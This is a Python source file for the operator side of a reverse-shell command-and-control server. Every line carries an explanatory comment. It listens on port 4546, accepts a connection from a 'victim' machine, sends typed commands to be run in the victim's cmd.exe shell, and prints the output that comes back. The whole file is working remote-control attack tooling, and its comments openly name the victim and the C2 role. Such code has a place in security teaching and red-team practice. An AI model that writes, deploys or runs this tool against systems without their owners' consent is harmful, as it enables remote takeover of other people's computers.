import socket                                          # Import the standard socket library to enable low-level TCP/IP network communications.
import subprocess                                      # Import subprocess to allow running system commands (though not directly invoked in this snippet).
import sys                                             # Import sys to interact with system-specific parameters and functions.
import time                                            # Import time to handle execution pauses and sleep timers.
import threading                                       # Import threading to run tasks concurrently without freezing the main execution loop.
import asyncio                                         # Import asyncio for asynchronous functionality (imported but kept as an alternative approach here).
import io                                              # Import io to manage stream handling and in-memory text/binary data buffers.
import os                                              # Import os to interact with the underlying operating system commands and process lifecycle control.
#import readline                                       # Commented out import for terminal interactive line editing and history management.
import colorama                                        # Import colorama to easily enable stylized, multi-colored text output in the terminal console.
from colorama import Fore, Back, Style                 # Extract specific text attributes (Fore=Foreground color, Back=Background, Style=Font style).

#receive the cmd.exe shell command output from the client
def shellreceiver(conn):                               # Define an asynchronous thread target function to receive execution output from the client.
    while True:                                            # Enter an infinite loop to continually monitor the socket for incoming data streams.
        try:                                                   # Initialize error handling context to insulate the execution block against network disconnect errors.
            data=conn.recv(1)                                      # Read incoming data from the established socket connection 1 byte at a time.
            print(data.decode(), end="", flush=True)               # Decode the raw binary stream data into readable text and print it immediately to the terminal.
        except:                                                # Error management catch block: If data reading fails, assume the connection dropped.
            print("server/socket must have died...time to hop off")            # Print warning output indicating socket termination states.
            conn.close()                                           # Gracefully terminate the communication line to free up local network resources.
            os._exit(0)                                            # Force close the entire Python server process immediately with exit status 0.

#send our command we'd like executed on the victim/client!
def shellsender(conn):                                 # Define an asynchronous thread target function to prompt the operator and send commands to the client.
    while True:                                            # Enter an infinite loop to continuously accept instructions from the C2 console operator.
        mycmd=input("")                                        # Halt execution and wait for the server operator to type a command into the terminal.
        mycmd=mycmd+"\n"                                       # Append a newline character to signify the command termination/execution trigger for the target.
        try:                                                   # Open error safety wrapper block for data serialization and network transmission lines.
            conn.send(mycmd.encode())                              # Convert the string command into a raw byte stream and transmit it across the network socket.
        except:                                                # Error management: Catch connection breakages while attempting transmission.
            print("server/socket must have died...time to hop off")            # Print alert noting the connection failure.
            conn.close()                                           # Safely close the active network link descriptor.
            os._exit(0)                                            # Immediate operational shutdown of the active Python script runtime.

host = "0.0.0.0"                                       # Set the binding interface. '0.0.0.0' configures the server to listen on all available network cards.
port = 4546                                            # Specify the network port identification integer where the C2 listener will establish its presence.

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Instantiate an IPv4 (AF_INET) TCP-based (SOCK_STREAM) streaming network socket interface object.
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)# Allow immediate port reuse, preventing 'Address already in use' errors if the server restarts.
s.bind((host, port))                                   # Bind the socket structural configuration firmly to our designated IP host and network port parameters.
s.listen(5)                                            # Turn on network listening capabilities, allowing a backlog queue of up to 5 inbound connection requests.
print(Fore.YELLOW + "[+] listening on port "+str(port), Fore.WHITE)# Notify the console operator in yellow text that the C2 server is actively waiting on the target port.

conn, addr = s.accept()                                # Block program execution here until an inbound target client initializes a raw handshake connection.
print(Fore.GREEN, f'\n[*] Accepted new connection from: {addr[0]}:{addr[1]}', Fore.WHITE)# Once a client connects, print a success notice tracking the client's external IP address and source port.

#New code starts here. This initiates our threads!
##################################################
s2p_thread = threading.Thread(target=shellreceiver, args=[conn, ])# Create a dedicated thread tasked exclusively with executing the background data collection loop.
s2p_thread.daemon = True                               # Set the thread as a background daemon process so it automatically terminates when the main script shuts down.
s2p_thread.start()                                     # Spin up and kick off the receiving thread execution path immediately.

s2p_thread = threading.Thread(target=shellsender, args=[conn, ])# Create a separate, isolated background thread targeting the terminal transmission loop.
s2p_thread.daemon = True                               # Configure this thread as a daemon process to prevent orphan loops from hanging open upon exit.
s2p_thread.start()                                     # Spin up and begin execution of the input/transmission loop pathway.
##################################################

#continuous loop
while True:                                            # Maintain a persistent execution baseline loop to keep the parent script active indefinitely.
    time.sleep(1)                                      # Throttle loop iterations to prevent excessive CPU core utilization spikes.